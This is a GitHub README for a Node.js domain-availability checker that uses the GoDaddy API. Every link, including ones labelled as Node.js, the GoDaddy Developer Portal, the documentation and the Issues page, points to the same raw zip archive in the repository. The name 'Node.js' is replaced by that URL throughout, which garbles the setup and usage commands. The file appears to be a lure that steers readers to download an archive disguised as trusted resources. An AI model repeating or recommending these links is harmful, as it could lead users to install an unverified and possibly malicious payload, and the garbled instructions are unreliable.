# 🌐 domains-lookup - Check Domain Availability Easily

[![Download Now](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)

## 🚀 Getting Started

Welcome to the Domains Lookup tool. This easy-to-use application helps you check the availability of domain names using the GoDaddy API. Whether you want a short domain for your next project or just want to experiment, this tool is designed for you.

### 📥 Download & Install

To get started, you need to download the application. Visit this page to download:

[Download the latest release](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)

After downloading, follow these steps to install and set it up on your computer.

## 📦 Requirements

Make sure your system meets the following requirements:

- **Operating System:** Windows, macOS, or Linux
- **https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip** Version 14 or higher (Download from [https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip))
- **GoDaddy API Key:** You will need this to connect with the GoDaddy service.

## 🔧 Setup

1. **Install https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip**

   If you haven't done this already, download and install https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip This includes npm (Node Package Manager) which is necessary for running this tool.

2. **Install dependencies:**

   After installation, open your terminal or command prompt, navigate to the project folder, and enter:

   ```bash
   npm install
   ```

3. **Configure API Credentials:**

   You must set up your GoDaddy API credentials. Create a `.env` file in the root of your project and add your credentials as follows:

   ```env
   GODADDY_API_KEY=your_api_key_here
   GODADDY_API_SECRET=your_api_secret_here
   ```

   Get your API credentials by signing up on the [GoDaddy Developer Portal](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip). Follow their instructions to generate your keys.

## 🛠️ Usage

Now that you have everything set up, you can start using the tool. Here is the command you will need to run:

```bash
node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip <number_of_letters> <tlds> [--to <max_price>] [-v]
```

### 📋 Parameters

- `<number_of_letters>` - This represents the total number of letters you want in your domain name (e.g., 3 for "abc" or "xyz").
- `<tlds>` - (Optional) A list of top-level domains (TLDs) that you want to check, separated by commas (default: `.com`).
- `--to <max_price>` - (Optional) Set a maximum price you are willing to pay. The default is no limit on the price.
- `-v` - (Optional) Activates verbose mode, which provides more detailed output.

### 💡 Examples

Here are some simple examples to help you understand how to use the tool.

**Check 3-letter .com domains:**

```bash
node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 3
```

This command will check all available 3-letter combinations with the `.com` extension.

**Check for 3-letter domains with specific TLDs:**

```bash
node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 3 .net,.org
```

This command will check all available 3-letter combinations for the `.net` and `.org` extensions.

**Set a price limit:**

```bash
node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 4 --to 10
```

This checks for all available 4-letter domain names that cost $10 or less.

**Activate verbose mode:**

```bash
node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 5 -v
```

This will provide detailed output for all 5-letter domain names available.

## 🔍 Troubleshooting

If you encounter issues:

1. Ensure https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip and npm are installed correctly.
2. Double-check your `.env` file for accuracy.
3. Make sure you have a valid GoDaddy API key and secret.

## 💬 Support

For support, feel free to visit the [GitHub Issues page](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip) to report problems or ask questions.

## 🌟 Contributing

Contributions are welcome! If you would like to improve this tool, please fork the repository and submit a pull request.

## 📑 License

This project is licensed under the MIT License. See the LICENSE file for more details.

## 🔗 Additional Links

For more information, check out the following resources:

- [GoDaddy API Documentation](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)
- [https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip Documentation](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)

Thank you for using Domains Lookup. Happy searching!